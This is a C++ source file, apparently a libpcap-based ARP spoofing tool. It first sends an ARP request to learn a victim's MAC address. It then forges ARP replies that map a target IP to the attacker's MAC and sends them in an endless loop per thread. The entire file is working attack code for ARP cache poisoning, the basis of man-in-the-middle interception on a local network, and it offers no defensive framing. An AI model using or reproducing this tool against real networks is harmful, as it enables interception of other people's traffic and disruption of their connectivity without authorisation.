#include "arpattk.h"

void arp_request(pcap_t* handle, char* sender_ip, char* attacker_ip, uint8_t* attacker_mac){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(attacker_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void send_arp(pcap_t* handle, EthArpPacket packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

EthArpPacket set_arp_packet(EthArpPacket packet, char* sender_ip, Mac sender_mac, char* target_ip, char* attacker_ip, uint8_t* attacker_mac){
	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	return packet;
}

void* arp_send_attack(void* thread_argv){
	EthArpPacket packet;
	MultiArgv* attack_data = (MultiArgv*)thread_argv;

	printf("[>]THREAD START!\n");
	arp_request(attack_data->handle, attack_data->sender_ip, attack_data->attacker_ip, attack_data->attacker_mac);
	Mac sender_mac = get_sender_mac(attack_data->handle, attack_data->sender_ip, attack_data->attacker_ip, attack_data->attacker_mac);
	if(sender_mac == Mac::nullMac()){
		printf("get sender mac failed\n");
	}

	packet = set_arp_packet(packet, attack_data->sender_ip, sender_mac, attack_data->target_ip, attack_data->attacker_ip, attack_data->attacker_mac);
	printf("[+]%s ATTACK START!\n", attack_data->sender_ip);
	while(true){
		send_arp(attack_data->handle, packet);
	}
}